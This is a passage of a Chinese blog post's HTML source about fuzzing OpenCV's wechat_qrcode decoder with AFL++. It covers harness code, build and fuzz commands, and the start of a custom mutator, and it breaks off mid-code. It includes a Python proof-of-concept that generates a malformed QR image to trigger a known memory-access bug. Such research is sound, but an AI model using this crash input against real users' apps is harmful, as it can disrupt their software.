@@ -1,0 +1,1386 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+  <meta charset="UTF-8">
+  <meta 
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta 
+    http-equiv="X-UA-Compatible" 
+    content="ie=edge">
+  <meta 
+    name="theme-color" 
+    content="#fff" 
+    id="theme-color">
+  <meta 
+    name="description" 
+    content="网络安全 Android ML CTF">
+  <link 
+    rel="icon" 
+    href="/images/logo.png">
+  <title>wechat qrcode bug fuzzing</title>
+  
+    
+      <meta 
+        property="og:title" 
+        content="wechat qrcode bug fuzzing">
+    
+    
+      <meta 
+        property="og:url" 
+        content="https://ch3nye.top/wechat-qrcode-bug-fuzzing/index.html">
+    
+    
+      <meta 
+        property="og:img" 
+        content="/images/logo.png">
+    
+    
+      <meta 
+        property="og:img" 
+        content="网络安全 Android ML CTF">
+    
+    
+      <meta 
+        property="og:type" 
+        content="article">
+      <meta 
+        property="og:article:published_time" 
+        content="2023-06-27">
+      <meta 
+        property="og:article:modified_time" 
+        content="2023-06-27">
+      <meta 
+        property="og:article:author" 
+        content="Ch3nYe">
+      
+        
+          <meta 
+            property="og:article:tag" 
+            content="Fuzzing">
+        
+          <meta 
+            property="og:article:tag" 
+            content="Binary">
+        
+          <meta 
+            property="og:article:tag" 
+            content="Rust">
+        
+      
+    
+  
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+    function loadCSS(href, data, attr) {
+      var sheet = document.createElement('link');
+      sheet.ref = 'stylesheet';
+      sheet.href = href;
+      sheet.dataset[data] = attr;
+      document.head.appendChild(sheet);
+    }
+    function changeCSS(cssFile, data, attr) {
+      var oldlink = document.querySelector(data);
+      var newlink = document.createElement("link");
+      newlink.setAttribute("rel", "stylesheet");
+      newlink.setAttribute("href", cssFile);
+      newlink.dataset.prism = attr;
+      document.head.replaceChild(newlink, oldlink);
+    }
+  </script>
+  
+    
+      
+      
+      
+      
+        
+        
+        
+        <script>
+          function prismThemeChange() {
+            if(document.getElementById('theme-color').dataset.mode === 'dark') {
+              if(document.querySelector('[data-prism]')) {
+                changeCSS('/js/lib/prism/prism-tomorrow.min.css', '[data-prism]', 'prism-tomorrow');
+              } else {
+                loadCSS('/js/lib/prism/prism-tomorrow.min.css', 'prism', 'prism-tomorrow');
+              }
+            } else {
+              if(document.querySelector('[data-prism]')) {
+                changeCSS('/js/lib/prism/prism.min.css', '[data-prism]', 'prism');
+              } else {
+                loadCSS('/js/lib/prism/prism.min.css', 'prism', 'prism');
+              }
+            }
+          }
+          prismThemeChange()
+        </script>
+      
+      
+        
+        <link rel="stylesheet" href="/js/lib/prism/prism-line-numbers.min.css">
+      
+    
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+  </script>
+  
+    <script>
+      var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+        prismThemeChange();
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+        prismThemeChange();
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
+        prismThemeChange();
+      }
+    };
+    setDarkmode();
+    </script>
+  
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+    
+    <link rel="prefetch" href="//cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css" as="script">
+  
+  
+    
+    <link rel="prefetch" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js" as="script">
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+  
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+  <body>
+    <div class="wrapper">
+       
+      <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+        <img 
+          class="navbar-logo-img"
+          width="32"
+          height="32"
+          src="/images/logo.png" 
+          alt="blog logo">
+      
+      <span class="navbar-logo-dsc">ch3nye's blog</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+      <a 
+        href="/" 
+        class="navbar-menu-item">
+        
+          首页
+        
+      </a>
+    
+      <a 
+        href="/archives" 
+        class="navbar-menu-item">
+        
+          归档
+        
+      </a>
+    
+      <a 
+        href="/tags" 
+        class="navbar-menu-item">
+        
+          标签
+        
+      </a>
+    
+      <a 
+        href="/categories" 
+        class="navbar-menu-item">
+        
+          分类
+        
+      </a>
+    
+      <a 
+        href="/about" 
+        class="navbar-menu-item">
+        
+          关于
+        
+      </a>
+    
+      <a 
+        href="/links" 
+        class="navbar-menu-item">
+        
+          友链
+        
+      </a>
+    
+      <a 
+        href="/shuoshuo" 
+        class="navbar-menu-item">
+        
+          说说
+        
+      </a>
+    
+    <a 
+      class="navbar-menu-item darknavbar" 
+      id="dark">
+      <i class="iconfont icon-weather"></i>
+    </a>
+    <a 
+      class="navbar-menu-item searchnavbar" 
+      id="search">
+      <i 
+        class="iconfont icon-search" 
+        style="font-size: 1.2rem; font-weight: 400;">
+      </i>
+    </a>
+  </div>
+</nav> 
+      
+      <div 
+        id="local-search" 
+        style="display: none">
+        <input
+          class="navbar-menu-item"
+          id="search-input"
+          placeholder="请输入搜索内容..." />
+        <div id="search-content"></div>
+      </div>
+      
+      <div class="section-wrap">
+        <div class="container">
+          <div class="columns">
+            <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      wechat qrcode bug fuzzing
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2023-06-26T16:00:00.000Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2023-06-27</span>
+    </time>
+    
+      <span class="dot"></span>
+      
+        <a 
+          href="/categories/%E5%AE%9E%E6%88%98/" 
+          class="post-meta-link">
+          实战
+        </a>
+      
+    
+    
+      <span class="dot"></span>
+      <span>3.2k 字</span>
+    
+  </div>
+  
+    <div 
+      class="post-meta post-show-meta" 
+      style="margin-top: -10px;">
+      <div style="display: flex; align-items: center;">
+        <i 
+          class="iconfont icon-biaoqian" 
+          style="margin-right: 2px; font-size: 1.15rem;">
+        </i>
+        
+          
+          <a 
+            href="/tags/Fuzzing/" 
+            class="post-meta-link">
+            Fuzzing
+          </a>
+        
+          
+            <span class="dot"></span>
+          
+          <a 
+            href="/tags/Binary/" 
+            class="post-meta-link">
+            Binary
+          </a>
+        
+          
+            <span class="dot"></span>
+          
+          <a 
+            href="/tags/Rust/" 
+            class="post-meta-link">
+            Rust
+          </a>
+        
+      </div>
+    </div>
+  
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <h1 id="wechat-qrcode-bug-fuzzing"><a class="markdownIt-Anchor" href="#wechat-qrcode-bug-fuzzing"></a> wechat qrcode bug fuzzing</h1>
+<blockquote>
+<p>TL;DR 针对近期爆出来的 opencv_contrib/modules/wechat_qrcode 二维码解析bug，写了 custom mutator （实现了Python版本和Rust版本），利用AFL++顺利fuzzing到了这个bug。</p>
+</blockquote>
+<blockquote>
+<p>最近重拾fuzzing，学点挖洞技巧，准备找工作了，学术圈我是混不明白了。这个文章就作为学习记录。</p>
+</blockquote>
+<br>
+<p><em><code>new a aflplusplus container</code></em></p>
+<p><code>cd /src</code></p>
+<p><code>git clone [https://github.com/opencv/opencv_contrib.git](https://github.com/opencv/opencv_contrib.git) -b 960b3f685f39c0602b8a0dd35973a82ee72b7e3c</code></p>
+<p><code>git clone [https://github.com/opencv/opencv.git](https://github.com/opencv/opencv.git) -b 85ea247cc6fd840ee477d03fc9aa31c8c7f6d9ef</code></p>
+<p><code>mkdir build &amp;&amp; cd build</code></p>
+<p><code>cmake -DCMAKE_C_COMPILER=afl-clang-fast -DCMAKE_CXX_COMPILER=afl-clang-fast++ -DBUILD_SHARED_LIBS=OFF -DOPENCV_EXTRA_MODULES_PATH=/src/opencv_contrib/modules /src/opencv</code></p>
+<p>修改 opencv_contrib/modules/wechat_qrcode/test/test_main.cpp：</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"test_precomp.hpp"</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"opencv2/objdetect.hpp"</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"opencv2/wechat_qrcode.hpp"</span></span>
+
+<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>
+<span class="token keyword">using</span> <span class="token keyword">namespace</span> cv<span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    string <span class="token function">image_path</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    Mat src <span class="token operator">=</span> <span class="token function">imread</span><span class="token punctuation">(</span>image_path<span class="token punctuation">,</span> IMREAD_GRAYSCALE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>src<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        wechat_qrcode<span class="token operator">::</span>WeChatQRCode detector<span class="token punctuation">;</span>
+        vector<span class="token operator">&lt;</span>string<span class="token operator">></span> outs <span class="token operator">=</span> detector<span class="token punctuation">.</span><span class="token function">detectAndDecode</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// print outs</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> outs<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            cout <span class="token operator">&lt;&lt;</span> outs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>AFL_USE_ASAN=1 make -j32 -C modules/wechat_qrcode</code></p>
+<p>target: <code>bin/opencv_test_wechat_qrcode</code></p>
+<br>
+<p>编译完可以找个poc试一下，确保没编译出问题：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/opencv/opencv_contrib/pull/3480">fix(wechat_qrcode): Init nBytes after the count value is determined by Konano · Pull Request #3480 · opencv/opencv_contrib (github.com)</a></p>
+<details><summary>生成poc的代码参考：</summary>
+<p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> qrcode
+<span class="token keyword">from</span> qrcode<span class="token punctuation">.</span>util <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> qrcode <span class="token keyword">import</span> QRCode
+
+<span class="token keyword">def</span> <span class="token function">hack_put</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> num<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            num <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment"># make a fake length, too big will not crash </span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            self<span class="token punctuation">.</span>put_bit<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>num <span class="token operator">>></span> <span class="token punctuation">(</span>length <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
+
+qrcode<span class="token punctuation">.</span>util<span class="token punctuation">.</span>BitBuffer<span class="token punctuation">.</span>put <span class="token operator">=</span> hack_put <span class="token comment"># random_put</span>
+
+qr <span class="token operator">=</span> QRCode<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> qrcode<span class="token punctuation">.</span>constants<span class="token punctuation">.</span>ERROR_CORRECT_L<span class="token punctuation">,</span> mask_pattern<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+data <span class="token operator">=</span> <span class="token string">"POC"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
+data <span class="token operator">+=</span> <span class="token string">b' '</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">19</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment"># 19为1-L的Total Number of Data Codewords for this Version and EC Level，-3是由于模式和长度指示器共占了24位，正好为3Byte。</span>
+user_data<span class="token operator">=</span>QRData<span class="token punctuation">(</span>data<span class="token punctuation">,</span> MODE_8BIT_BYTE<span class="token punctuation">)</span>
+hack_data<span class="token operator">=</span>QRData<span class="token punctuation">(</span><span class="token string">b''</span><span class="token punctuation">,</span> MODE_8BIT_BYTE<span class="token punctuation">)</span>
+
+qr<span class="token punctuation">.</span>add_data<span class="token punctuation">(</span>user_data<span class="token punctuation">)</span>
+qr<span class="token punctuation">.</span>add_data<span class="token punctuation">(</span>hack_data<span class="token punctuation">)</span>
+
+img <span class="token operator">=</span> qr<span class="token punctuation">.</span>make_image<span class="token punctuation">(</span><span class="token punctuation">)</span>
+img<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'hack.png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</p>
+</details>
+<br>
+<p>bug分析我就不写了，看上面的pr就能看明白，关于qrcode的更多信息可以参考这篇复现：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/365526.html">WECHAT二维码闪退分析 - FreeBuf网络安全行业门户</a></p>
+<br>
+<p>现就可以找一些二维码图片开始疯狂fuzzing，但是就算很小的二维码图片也有300多字节，如果按照bit变异，很大概率是没法发通过opencv对二维码图片的解析的，变到猴年也很难顺利触法这个bug。</p>
+<p>于是自然就想到，要基于正确的二维码图片格式做一些变异。这个方法 <a target="_blank" rel="noopener" href="https://paper.seebug.org/2079/">evilpan</a> 已经做过尝试，但是他做的变异范围比较广，所有的qrcode的可选字段他都random生成，然后基于生成的正常qrcode做一些bit翻转。他的测试是发了一个月也没看到crash。其实正常的fuzzing就应该是这样，但是我这里就拿着锤子找钉子，做针对性的变异。</p>
+<br>
+<h2 id="afl-persistent-mode"><a class="markdownIt-Anchor" href="#afl-persistent-mode"></a> AFL++ persistent mode</h2>
+<p>persistent mode 速度比默认AFL++快很多，官方文档说速度x10 or x20，可以参考：<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.persistent_mode.md">AFLplusplus/instrumentation/README.persistent_mode.md at stable · AFLplusplus/AFLplusplus · GitHub</a></p>
+<p>实际 fuzzing 测试 persist mode 确实比默认编译的 <strong>opencv_test_wechat_qrcode</strong> 测试快10多倍。</p>
+<br>
+<p>修改 opencv_contrib/modules/wechat_qrcode/test/test_main.cpp：</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"test_precomp.hpp"</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"opencv2/objdetect.hpp"</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"opencv2/wechat_qrcode.hpp"</span></span>
+
+<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>
+<span class="token keyword">using</span> <span class="token keyword">namespace</span> cv<span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> <span class="token function">fuzz_buf</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  Mat src <span class="token operator">=</span> <span class="token function">imdecode</span><span class="token punctuation">(</span><span class="token function">Mat</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token punctuation">,</span> CV_8UC1<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">,</span> IMREAD_GRAYSCALE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>src<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">auto</span> detector <span class="token operator">=</span> wechat_qrcode<span class="token operator">::</span><span class="token function">WeChatQRCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    std<span class="token operator">::</span>vector<span class="token operator">&lt;</span>std<span class="token operator">::</span>string<span class="token operator">></span> outs <span class="token operator">=</span> detector<span class="token punctuation">.</span><span class="token function">detectAndDecode</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> outs<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">__AFL_FUZZ_INIT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token comment">// anything else here, e.g. command line arguments, initialization, etc.</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__AFL_HAVE_MANUAL_CONTROL</span></span>
+  <span class="token function">__AFL_INIT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+
+  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>buf <span class="token operator">=</span> __AFL_FUZZ_TESTCASE_BUF<span class="token punctuation">;</span>  <span class="token comment">// must be after __AFL_INIT</span>
+                                                 <span class="token comment">// and before __AFL_LOOP!</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">__AFL_LOOP</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">int</span> len <span class="token operator">=</span> __AFL_FUZZ_TESTCASE_LEN<span class="token punctuation">;</span>  <span class="token comment">// don't use the macro directly in a</span>
+                                        <span class="token comment">// call!</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>  <span class="token comment">// check for a required/useful minimum input length</span>
+    <span class="token comment">/* Setup function call, e.g. struct target *tmp = libtarget_init() */</span>
+    <span class="token comment">/* Call function to be fuzzed, e.g.: */</span>
+    <span class="token function">fuzz_buf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">/* Reset state. e.g. libtarget_free(tmp) */</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>编译目标路径相同:</p>
+<p>target: <code>bin/opencv_test_wechat_qrcode</code></p>
+<p><code>mv bin/opencv_test_wechat_qrcode bin/opencv_test_wechat_qrcode_persist</code></p>
+<br>
+<p>fuzzing cmd:</p>
+<p><code>afl-fuzz -i corpus/ -o output -t +2000 -- ./opencv_test_wechat_qrcode_persist</code></p>
+<p>corpus 下面放几个能正常解析的qrcode图片</p>
+<p><img src="/images/wechatqrcodefuzz/Untitled.png" alt="Untitled" / srcset="/images/LoadingImage.gif" data-src="/images/wechatqrcodefuzz/Untitled.png" class="lozad post-image"></p>
+<br>
+<p>发了将近一天，什么有用的都没发到，解析导致crash的28个文件，全部都是被opencv的代码顺利捕获的<code>cv::Exception</code> 图像解析异常，导致的Aborted也没啥用。并没有执行到目标子模块中的关键decode函数</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">terminate called after throwing an instance of <span class="token string">'cv::Exception'</span>
+  what<span class="token punctuation">(</span><span class="token punctuation">)</span>:  OpenCV<span class="token punctuation">(</span><span class="token number">4.8</span>.0-pre<span class="token punctuation">)</span> /src/opencv/modules/imgcodecs/src/loadsave.cpp:77: error: <span class="token punctuation">(</span>-215:Assertion failed<span class="token punctuation">)</span> static_cast<span class="token operator">&lt;</span>size_t<span class="token operator">></span><span class="token punctuation">(</span>size.height<span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">=</span> CV_IO_MAX_IMAGE_HEIGHT <span class="token keyword">in</span> <span class="token keyword">function</span> <span class="token string">'validateInputImageSize'</span>
+
+Aborted <span class="token punctuation">(</span>core dumped<span class="token punctuation">)</span>
+<span class="token number">34304</span>
+terminate called after throwing an instance of <span class="token string">'cv::Exception'</span>
+  what<span class="token punctuation">(</span><span class="token punctuation">)</span>:  OpenCV<span class="token punctuation">(</span><span class="token number">4.8</span>.0-pre<span class="token punctuation">)</span> /src/opencv/modules/imgcodecs/src/loadsave.cpp:79: error: <span class="token punctuation">(</span>-215:Assertion failed<span class="token punctuation">)</span> pixels <span class="token operator">&lt;</span><span class="token operator">=</span> CV_IO_MAX_IMAGE_PIXELS <span class="token keyword">in</span> <span class="token keyword">function</span> <span class="token string">'validateInputImageSize'</span>
+
+Aborted <span class="token punctuation">(</span>core dumped<span class="token punctuation">)</span>
+<span class="token number">34304</span>
+terminate called after throwing an instance of <span class="token string">'cv::Exception'</span>
+  what<span class="token punctuation">(</span><span class="token punctuation">)</span>:  OpenCV<span class="token punctuation">(</span><span class="token number">4.8</span>.0-pre<span class="token punctuation">)</span> /src/opencv/modules/imgcodecs/src/loadsave.cpp:75: error: <span class="token punctuation">(</span>-215:Assertion failed<span class="token punctuation">)</span> static_cast<span class="token operator">&lt;</span>size_t<span class="token operator">></span><span class="token punctuation">(</span>size.width<span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">=</span> CV_IO_MAX_IMAGE_WIDTH <span class="token keyword">in</span> <span class="token keyword">function</span> <span class="token string">'validateInputImageSize'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这和 <a target="_blank" rel="noopener" href="https://paper.seebug.org/2079/">evilpan</a> 测试的fuzzing结果是一样的</p>
+<br>
+<h2 id="custom-mutator"><a class="markdownIt-Anchor" href="#custom-mutator"></a> custom mutator</h2>
+<p>接下来就是拿着锤子找钉子环节，鉴于我们已经知道了bug的原因：opencv_contrib/modules/wechat_qrcode/src/zxing/qrcode/decoder/decoded_bit_stream_parser.cpp 中 DecodedBitStreamParser::decodeByteSegment 函数里 nBytes，count 赋值有bug，导致读取qrcode里一段data时可能出现数据计数count≠0，而data=“”的情况，最后导致非法内存访问。具体解析可以看上面提到的pr。</p>
+<p>简单起见，我们可以定制一个mutator，生成一个小的qrcode，然后疯狂的random变异他一段数据的长度和count这两个字段：</p>
+<br>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> qrcode
+<span class="token keyword">from</span> qrcode<span class="token punctuation">.</span>util <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">import</span> random
+<span class="token keyword">from</span> qrcode <span class="token keyword">import</span> util<span class="token punctuation">,</span> QRCode
+<span class="token keyword">from</span> bisect <span class="token keyword">import</span> bisect_left
+<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
+
+<span class="token keyword">def</span> <span class="token function">hack_data_len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># return len(data) # original</span>
+    <span class="token keyword">return</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span> <span class="token comment"># make a fake length, too big will not crash</span>
+
+<span class="token keyword">def</span> <span class="token function">hack_create_data</span><span class="token punctuation">(</span>version<span class="token punctuation">,</span> error_correction<span class="token punctuation">,</span> data_list<span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    <span class="token builtin">buffer</span> <span class="token operator">=</span> BitBuffer<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> data <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>
+        <span class="token builtin">buffer</span><span class="token punctuation">.</span>put<span class="token punctuation">(</span>data<span class="token punctuation">.</span>mode<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
+        data_len <span class="token operator">=</span> hack_data_len<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
